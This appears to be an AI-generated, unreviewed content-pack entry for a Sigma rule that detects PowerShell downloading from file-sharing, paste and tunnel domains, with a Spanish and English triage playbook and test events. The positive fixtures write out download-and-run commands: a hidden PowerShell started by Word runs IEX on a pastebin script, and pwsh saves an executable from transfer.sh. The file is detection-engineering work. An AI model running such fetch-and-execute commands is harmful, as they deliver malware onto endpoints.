@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "b6e04788-29e1-4557-bb14-77f761848ab8",
+    "title": "Potentially Suspicious File Download From File Sharing Domain Via PowerShell.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_download_susp_file_sharing_domains.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_download_susp_file_sharing_domains.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "PowerShell (powershell.exe o pwsh.exe) se ejecutó con una línea de comandos que descarga contenido desde un dominio público de intercambio de archivos, pastes, túneles o DNS dinámico. Es un patrón frecuente para traer payloads o scripts de segunda etapa.",
+      "what_it_detects": "Creación de un proceso PowerShell, identificado por Image u OriginalFileName, cuyo CommandLine contiene un dominio de la lista (pastebin.com, transfer.sh, mega.nz, cdn.discordapp.com, trycloudflare.com, workers.dev, etc.) y además un método de descarga (.DownloadString(, .DownloadFile(, Invoke-WebRequest, iwr o wget).",
+      "why_it_matters": "Los atacantes usan PowerShell (Execution, T1059.001) para traer herramientas al endpoint (ingress tool transfer) desde servicios legítimos que no suelen estar bloqueados. Con DownloadString suele seguir IEX, que ejecuta el código en memoria sin dejar archivo.",
+      "triage_steps": [
+        "Revise CommandLine completo: URL exacta, método (DownloadString con IEX o DownloadFile/-OutFile), ruta de destino y opciones como -nop, -w hidden o -enc.",
+        "Identifique ParentImage y su línea de comandos: Office, navegador, wscript, mshta, servicios web o agentes RMM como ScreenConnect elevan mucho la sospecha.",
+        "Confirme el usuario y el host: ¿es una cuenta de servicio, un administrador o un usuario estándar? ¿El host es servidor crítico (por ejemplo, Veeam)?",
+        "Busque en el mismo host, dentro de +/- 15 minutos, procesos hijos de PowerShell, archivos creados en la ruta de destino y conexiones de red al dominio.",
+        "Si hubo archivo descargado, obtenga su hash y consulte reputación; si fue DownloadString, revise el Script Block Logging (4104) para ver el código ejecutado.",
+        "Busque la misma URL o dominio en otros hosts y en logs de proxy/DNS, y revise alertas previas para el mismo usuario y host."
+      ],
+      "false_positives": [
+        "Scripts administrativos o de despliegue que descargan instaladores desde storage.googleapis.com, workers.dev, pages.dev o dl.dropboxusercontent.com.",
+        "Desarrolladores o equipos de TI que prueban herramientas alojadas en glitch.me, onrender.com o supabase.co.",
+        "Herramientas internas publicadas mediante túneles de Cloudflare o nombres de DNS dinámico (ddns.net)."
+      ],
+      "response_steps": [
+        "Verifique con el dueño del host o del script si la descarga era esperada; documente la URL y el hash.",
+        "Si no es legítima, aísle el endpoint desde el EDR y bloquee la URL y el dominio en proxy y DNS.",
+        "Preserve evidencia (archivo descargado, memoria, logs de PowerShell) antes de eliminar artefactos o matar procesos.",
+        "Busque persistencia (tareas programadas, servicios, claves Run) y rote credenciales del usuario afectado si hubo ejecución.",
+        "Restaure el equipo desde una imagen limpia si se confirma compromiso y añada exclusiones solo para scripts validados."
+      ],
+      "severity_rationale": "Es alta porque descargar con PowerShell desde servicios de archivos o pastes es poco común en uso legítimo y suele indicar entrega de malware."
+    },
+    "en": {
+      "summary": "PowerShell (powershell.exe or pwsh.exe) ran with a command line that downloads content from a public file-sharing, paste, tunnel or dynamic DNS domain. Attackers often use this to fetch payloads or second-stage scripts.",
+      "what_it_detects": "A PowerShell process, identified by Image or OriginalFileName, whose CommandLine contains a listed domain (pastebin.com, transfer.sh, mega.nz, cdn.discordapp.com, trycloudflare.com, workers.dev, etc.) plus a download method (.DownloadString(, .DownloadFile(, Invoke-WebRequest, iwr or wget).",
+      "why_it_matters": "Attackers use PowerShell (Execution, T1059.001) to transfer tools onto the endpoint from legitimate services that are rarely blocked. DownloadString is often paired with IEX, which runs code in memory without leaving a file on disk.",
+      "triage_steps": [
+        "Read the full CommandLine: exact URL, method (DownloadString with IEX, or DownloadFile/-OutFile), destination path, and flags such as -nop, -w hidden or -enc.",
+        "Identify ParentImage and its command line. Office, browsers, wscript, mshta, web server processes or RMM agents such as ScreenConnect make this much more suspicious.",
+        "Check the user and host: service account, admin or standard user? Is the host a critical server, such as a backup server?",
+        "On the same host within +/- 15 minutes, look for PowerShell child processes, files written to the destination path and network connections to the domain.",
+        "If a file was saved, hash it and check its reputation. For DownloadString, review Script Block Logging (4104) to see the code that ran.",
+        "Search proxy and DNS logs for the same URL or domain on other hosts. Review earlier alerts for the same user and host."
+      ],
+      "false_positives": [
+        "Admin or deployment scripts pulling installers from storage.googleapis.com, workers.dev, pages.dev or dl.dropboxusercontent.com.",
+        "Developers or IT staff testing tools hosted on glitch.me, onrender.com or supabase.co.",
+        "Internal tools published through Cloudflare tunnels or dynamic DNS names (ddns.net)."
+      ],
+      "response_steps": [
+        "Ask the host or script owner whether the download was expected. Record the URL and hash.",
+        "If it was not legitimate, isolate the endpoint through EDR and block the URL and domain at the proxy and DNS.",
+        "Preserve evidence (downloaded file, memory, PowerShell logs) before you delete artifacts or kill processes.",
+        "Hunt for persistence (scheduled tasks, services, Run keys). If anything executed, reset the affected user's credentials.",
+        "If compromise is confirmed, reimage the host. Add exclusions only for scripts you have validated."
+      ],
+      "severity_rationale": "High fits because PowerShell downloads from file-sharing or paste services are rare in legitimate use and often mean malware is being delivered."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Hidden PowerShell started by Word fetches a script from pastebin.com with DownloadString and runs it with IEX",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/Xk7pQ2aB')\"",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jperez\\Downloads\\factura.docm\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "pwsh.exe uses Invoke-WebRequest to save a binary from transfer.sh to a public folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-BKP-01.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "OriginalFileName": "pwsh.dll",
+          "CommandLine": "pwsh.exe -NoProfile -Command Invoke-WebRequest -Uri https://transfer.sh/a1b2c3/tool.exe -OutFile C:\\Users\\Public\\tool.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c pwsh.exe -NoProfile -Command ...",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "PowerShell downloads a setup script from raw.githubusercontent.com, which is intentionally commented out of the rule's domain list",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -ExecutionPolicy Bypass -c \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/example-org/tools/main/setup.ps1 -OutFile C:\\Temp\\setup.ps1\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "curl.exe downloads from transfer.sh; the domain matches but the process is not PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe -o C:\\Users\\jperez\\Downloads\\report.zip https://transfer.sh/z9y8x7/report.zip",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
